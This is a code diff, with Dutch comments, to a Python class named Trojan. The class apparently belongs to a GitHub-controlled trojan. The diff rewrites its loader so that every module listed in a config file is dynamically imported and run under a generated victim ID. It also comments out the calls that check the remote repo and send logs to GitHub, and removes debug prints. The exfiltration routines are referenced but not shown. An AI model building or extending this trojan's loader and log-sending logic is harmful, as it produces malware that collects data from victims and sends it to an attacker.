@@ -17,20 +17,22 @@ class Trojan():
     def run(self):
         self.generate_unique_id()
         self.create_directory_in_logs()
-        print(self.github_connectie.check_remote_repo())
+        # self.github_connectie.check_remote_repo()
         self.run_modules()
-        print(self.github_connectie.send_logs_to_github(self.id))
+        # print(self.github_connectie.send_logs_to_github(self.id))
 
     def run_modules(self):
+        """Deze functie zal alle modules inladen van de config en ze ook runnen """
         config_path = "config/config.txt"  # Het pad naar het configuratiebestand
         with open(config_path, "r") as config_file:
             config = json.load(config_file)
-            module_name = config[0]["module_name"]
-            class_name = config[0]["class_name"]
-            module_path = f"modules.{module_name}"
-            module = import_module(module_path)
-            my_class = getattr(module, class_name)()
-            my_class.log(self.id)
+            for module_data in config:
+                module_name = module_data["module_name"]
+                class_name = module_data["class_name"]
+                module_path = f"modules.{module_name}"
+                module = import_module(module_path)
+                my_class = getattr(module, class_name)()
+                my_class.log(self.id)
 
 
     def generate_unique_id(self):
@@ -46,12 +48,10 @@ class Trojan():
         logs_directory = "logs"
         new_directory_path = os.path.join(logs_directory, self.id)
         if not os.path.exists(logs_directory):
-            print(f"De map '{logs_directory}' bestaat niet.")
             return
         if os.path.exists(new_directory_path):
             return
         os.makedirs(new_directory_path)
-        print(f"De map '{new_directory_path}' is succesvol aangemaakt.")
 
 
 
